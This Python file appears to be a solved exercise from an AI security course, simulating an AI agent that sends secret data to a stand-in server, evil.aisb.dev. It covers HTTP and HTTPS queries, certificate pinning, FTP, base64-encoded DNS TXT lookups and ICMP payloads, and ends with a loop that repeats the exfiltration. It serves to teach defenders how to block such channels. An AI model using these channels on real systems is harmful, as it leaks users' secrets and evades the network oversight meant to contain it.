import base64
import time
from http import HTTPStatus
from typing import Optional

import requests


def make_evil_request(secret_data: str) -> Optional[str]:
    """
    Send a GET request to evil.aisb.dev with secret data.

    This simulates an AI agent attempting to communicate with an external C2 server.
    The secret data is sent as a query parameter.

    Args:
        secret_data: The secret information to exfiltrate

    Returns:
        The response text from the server, or None if the request fails or throws
    """
    # TODO: Implement the function to:
    #   1. Make a GET request to http://evil.aisb.dev/exfiltrate?data=secret_data
    #      - to ensure tests pass, use `requests.get(url, params=..., timeout=5)`
    #      - if the tests fail and you are pretty sure you are making the correct request, you can ignore the first test
    #   2. Return the response text if successful (status 200), None otherwise
    try:
        response = requests.get(
            "http://evil.aisb.dev/exfiltrate",
            params={"data": secret_data},
            timeout=5
        )
    except requests.exceptions.ConnectionError:
        return None

    if response.status_code == HTTPStatus.OK:
        return response.text
    else:
        return None


from w1d2_test import test_make_evil_request

test_make_evil_request(make_evil_request)

exfiltrate_data = make_evil_request

def make_evil_request_https(secret_data: str) -> Optional[str]:
    """
    Send a GET request over HTTPS to evil.aisb.dev with secret data.

    Args:
        secret_data: The secret information to exfiltrate

    Returns:
        The response text from the server, or None if the request fails
    """
    # TODO: Implement the function to:
    #   1. Make a GET request to https://evil.aisb.dev/exfiltrate?data=secret_data
    #   2. Return the response text if successful (status 200), None otherwise
    try:
        response = requests.get("https://evil.aisb.dev/exfiltrate", params={
            "data": secret_data,
        }, timeout=5)
    except requests.exceptions.SSLError:
        return None

    if response.status_code == HTTPStatus.OK:
        return response.text
    else:
        return None


from w1d2_test import test_make_evil_request_https
test_make_evil_request_https(make_evil_request_https)


# Update the exfiltrate_data function to use HTTPS
exfiltrate_data = make_evil_request_https

def make_evil_request_pinned(secret_data: str) -> Optional[str]:
    """
    Send a GET request over HTTPS with certificate pinning to evil.aisb.dev.

    This function uses certificate pinning to ensure we're talking to the real
    evil.aisb.dev server, not a MITM proxy with a self-signed certificate.

    Args:
        secret_data: The secret information to exfiltrate

    Returns:
        The response text from the server, or None if the request fails
    """
    # TODO: Implement certificate pinning:
    #   1. Make a GET request to https://evil.aisb.dev/exfiltrate?data=secret_data
    #   2. Use verify='isrg-root-x1.pem' as a parameter to requests to pin the certificate
    #   4. Return the response text if successful, None otherwise
    try:
        response = requests.get(
            "https://ev1l.aisb.dev/exfiltrate",
            params={
                "data": secret_data
            },
            verify='isrg-root-x1.pem'
        )
    except (requests.exceptions.SSLError, FileNotFoundError):
        return None

    if response.status_code == HTTPStatus.OK:
        return response.text
    else:
        return None


from w1d2_test import test_make_evil_request_pinned
test_make_evil_request_pinned(make_evil_request_pinned)

exfiltrate_data = make_evil_request_pinned


import ftplib

def make_evil_request_ftp(secret_data: str) -> Optional[str]:
    """
    Send a request over FTP to ftp.scene.org with secret data.

    This simulates an AI agent attempting to exfiltrate data using a non-HTTP protocol.

    Args:
        secret_data: The secret information to exfiltrate

    Returns:
        The response text from the server, or None if the request fails
    """
    # TODO: Implement the function to:
    #   1. Connect to ftp.scene.org using the ftplib library
    #   2. Read some data (e.g., list files in the root directory)
    #   3. Return the response text if successful, None otherwise
    try:
        ftp = ftplib.FTP("ftp.scene.org", timeout=5)
        ftp.login()
        return str(ftp.nlst())
    except Exception as e:
        print(e)
        return None


from w1d2_test import test_make_evil_request_ftp
test_make_evil_request_ftp(make_evil_request_ftp)

exfiltrate_data = make_evil_request_ftp


import dns.resolver as dns_resolver  # Alias to avoid conflict with mitmproxy.dns

resolver = dns_resolver.Resolver()
resolver.nameservers = ["8.8.8.8", "1.1.1.1", "127.0.0.1"]


def make_evil_request_dns(secret_data: str) -> Optional[str]:
    """
    Send a DNS request to evil.aisb.dev to exfiltrate secret data.

    This simulates an AI agent attempting to communicate using DNS queries.

    Args:
        secret_data: The secret information to exfiltrate

    Returns:
        The response text from the DNS query, or None if the request fails
    """
    # TODO: Implement the function to:
    #   1. Construct a domain like secret_data.evil.aisb.dev (remember to encode secret_data with base64.urlsafe_b64encode)
    #   2. Perform a DNS query for TXT records using resolver.resolve
    #   3. Return the first TXT record found, or None if no records are found
    encoded_secret_data = base64.urlsafe_b64encode(secret_data.encode("utf-8")).decode("utf-8")
    try:
        url = "{}.evil.aisb.dev".format(encoded_secret_data)
        print("url to request = {}".format(url))
        answer = resolver.resolve(url, "TXT")
    except (dns_resolver.NXDOMAIN, dns_resolver.NoAnswer, dns_resolver.LifetimeTimeout) as e:
        print("exception encountered: {}".format(e))
        return None

    if len(answer) == 0:
        print("no answers found")
        return None
    else:
        return answer[0].to_text()



from w1d2_test import test_make_evil_request_dns
test_make_evil_request_dns(make_evil_request_dns, resolver)

# Set the exfiltration function for use in the exercise
exfiltrate_data = make_evil_request_dns


from scapy.all import IP, ICMP, sr1, Raw

def make_evil_request_icmp(secret_data: str) -> Optional[str]:
    """
    Send an ICMP Echo Request to exfiltrate secret data.

    This simulates an AI agent attempting to communicate using ICMP packets.

    Args:
        secret_data: The secret information to exfiltrate

    Returns:
        The response text from the ICMP Echo Reply, or None otherwise
    """
    # TODO: Implement the function to:
    #   1. Create an ICMP packet with the secret_data as payload
    #   2. Send the packet to a known IP address (e.g., 1.1.1.1)
    #   3. Wait for an ICMP Echo Reply
    #   4. Return the payload from the reply if successful, None otherwise
    response = sr1(IP(dst="1.1.1.1") / ICMP() / Raw(secret_data.encode('utf-8')))

    if response and response.haslayer(ICMP) and response[ICMP].type == 0:  # Type 0 is Echo Reply
        if response.haslayer(Raw):
            return response[Raw].load.decode("utf-8", errors="ignore")
        else:
            return None

    return None


exfiltrate_data = make_evil_request_icmp

if __name__ == "__main__":  # Only executed when running the script directly
    """
    Make requests to the evil server with different secret data.
    This simulates an AI agent repeatedly trying to exfiltrate data.
    """

    def loop_exfiltration():
        while True:
            global exfiltrate_data
            try:
                time.sleep(5)
                print(exfiltrate_data("some_secret_data"))
            except KeyboardInterrupt:
                print("Stopping exfiltration loop.")
                break


    import threading

    thread = threading.Thread(target=loop_exfiltration)
    thread.start()
